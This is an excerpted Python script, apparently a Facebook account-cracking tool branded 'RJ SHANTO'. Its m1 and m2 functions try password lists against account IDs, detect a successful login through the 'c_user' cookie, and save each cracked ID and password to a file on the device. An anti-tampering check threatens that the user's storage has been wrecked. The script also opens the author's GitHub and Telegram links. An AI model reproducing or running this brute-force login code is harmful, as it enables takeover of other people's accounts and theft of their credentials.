...
time.sleep(3)
os.system(f'xdg-open https://github.com/RJSHANTO')
print()
attempts = 0
...
if not 'if self.url==' in open(fuck+'models.py','r').read():
    ...
    exit('\033[1;32mFUCK YOU BYPASS USER.YOUR STORAGE FUCKED BY RJ SHANTO.')
...
def menu():
    try:
        ...
        if 1 == 1:
            ...
            if xd in ['01', '1']:
                clear()
                print('\033[38;2;0;255;0m[FILE EXAMPLE: /sdcard/RJSHANTO.txt  Etc..]')
...
def m1(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;33m「RJ SHANTO-M1」 %s - \033[1;32m「OK ID:-%s」'% (loop, len(oks)));sys.stdout.flush()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;31m[RJ-CP]\033[1;35m  ' +ids+ ' • ' +pas+ ' \033[0;97m')
                os.system('espeak -a 300 "CP"')
                with open('/sdcard/xRJ-CP.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
                cps.append(ids)
                break
...
def m2(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;33m「RJ SHANTO-M2」 %s - \033[1;32m「OK ID:-%s」'% (loop, len(oks)));sys.stdout.flush()
    ses = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;31m[RJ SHANTO-CP]\033[1;35m  ' +ids+ ' • ' +pas+ ' \033[0;97m')
                os.system('espeak -a 300 "CP"')
                with open('/sdcard/xRJ-CP.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("xdg-open https://t.me/RjShanto7")
superuser()